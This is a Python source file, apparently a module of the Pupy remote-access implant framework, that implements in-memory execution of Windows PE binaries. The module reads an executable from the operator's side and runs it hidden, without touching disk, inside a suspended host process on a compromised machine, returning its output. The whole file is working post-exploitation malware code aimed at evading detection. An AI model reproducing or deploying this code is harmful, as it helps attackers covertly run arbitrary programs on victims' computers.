# -*- coding: UTF8 -*-
# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
# 
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
# 
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
# 
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------
from pupylib.PupyModule import *
from pupylib.PupyCompleter import *
from pupylib.utils.pe import get_pe_arch
from pupylib.PupyErrors import PupyModuleError

__class_name__="MemoryExec"

class MemoryExec(PupyModule):
	""" execute a PE executable from memory """
	interactive=1
	def __init__(self, *args, **kwargs):
		PupyModule.__init__(self,*args, **kwargs)
		self.interrupted=False
		self.mp=None
	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog="memory_exec", description=self.__doc__)
		self.arg_parser.add_argument('-p', '--process', default='cmd.exe', help='process to start suspended')
		self.arg_parser.add_argument('--fork', action='store_true', help='fork and do not wait for the child program. stdout will not be retrieved', completer=path_completer)
		self.arg_parser.add_argument('--interactive', action='store_true', help='interactive with the new process stdin/stdout')
		self.arg_parser.add_argument('path', help='path to the exe', completer=path_completer)
		self.arg_parser.add_argument('args', nargs='*', help='optional arguments to pass to the exe')

	@windows_only
	def is_compatible(self):
		pass

	def interrupt(self):
		self.info("interrupting remote process, please wait ...")
		if self.mp:
			self.mp.close()
			res=self.mp.get_stdout()
			self.log(res)

	def run(self, args):
		if args.interactive:
			#TODO
			self.error("interactive memory execution has not been implemented yet")
			return
		
		#check we are injecting from the good process arch:
		pe_arch=get_pe_arch(args.path)
		proc_arch=self.client.desc["proc_arch"]
		if pe_arch!=proc_arch:
			self.error("%s is a %s PE and your pupy payload is a %s process. Please inject a %s PE or first migrate into a %s process"%(args.path, pe_arch, proc_arch, proc_arch, pe_arch))
			return

		
		wait=True
		redirect_stdio=True
		if args.fork:
			wait=False
			redirect_stdio=False
		raw_pe=b""
		with open(args.path,'rb') as f:
			raw_pe=f.read()
		self.client.load_package("pupymemexec")
		self.client.load_package("pupwinutils.memexec")
		res=""
		self.mp=self.client.conn.modules['pupwinutils.memexec'].MemoryPE(raw_pe, args=args.args, hidden=True, redirect_stdio=redirect_stdio)
		self.mp.run()
		while True:
			if self.mp.wait(1):
				break
		self.mp.close()
		res=self.mp.get_stdout()
		self.log(res)


